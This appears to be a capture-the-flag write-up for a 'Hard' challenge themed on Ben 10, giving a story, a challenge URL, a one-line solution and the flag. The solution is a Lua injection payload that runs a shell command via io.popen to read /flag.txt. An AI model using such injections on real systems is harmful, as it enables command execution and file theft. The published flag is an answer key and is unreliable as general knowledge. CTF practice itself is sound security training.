# Challenge 22

## Difficulty

Hard

## Title

itsyourap's Shield

## Description

Ben stumbled upon one of Vilgax’s hidden communication systems while searching for intel on his latest evil scheme. It looks like the system is more than just a simple communication system—it holds something valuable, something that could give Ben the information about Vilgax. But there’s a catch.

Vilgax, always one step ahead, has hidden a secret deep within the system, and it’s locked behind layers of protection. It seems the system’s administrator, "itsyourap," has gone to great lengths to keep the secret safe, making sure that no one can access it.

Ben needs your help to break through these defenses and uncover the truth. The question is, can you bypass the system's defenses before Vilgax's trap closes in?

Open the website here: [vilgaxsys.cynox.aotfiesta25.tech](https://vilgaxsys.cynox.aotfiesta25.tech)

## Solution

```lua
config.usermessages[n]["message"] = io.popen('cat /flag.txt'):read('*a')
```

## Flag

```text
cyn0x{l33t_lu4_inj3ct10n_h4x0r_th3_fl4g_r3tr13v3d_4ft3r_c0nf1g_3x3cut10n}
```
